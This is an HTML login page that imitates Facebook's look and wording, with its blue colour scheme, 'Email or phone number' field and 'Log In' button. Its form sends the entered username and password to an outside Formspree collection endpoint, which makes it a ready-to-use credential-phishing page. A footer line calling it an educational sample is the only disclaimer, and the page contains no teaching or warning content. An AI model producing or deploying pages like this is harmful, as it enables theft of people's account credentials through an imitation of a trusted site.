
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f0f2f5;
      font-family: Arial, sans-serif;
    }
    .container {
      width: 90%;
      max-width: 400px;
      margin: 60px auto;
      padding: 30px 20px;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
    }
    h2 {
      color: #1877f2;
      text-align: center;
      font-size: 28px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      box-sizing: border-box;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
    }
    button:hover {
      background-color: #145dbf;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: gray;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Login</h2>
    <form action="https://formspree.io/f/xeogbvzj" method="POST">
      <input type="text" name="username" placeholder="Email or phone number" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <div class="footer">This is a sample educational project only</div>
  </div>
</body>
</html>
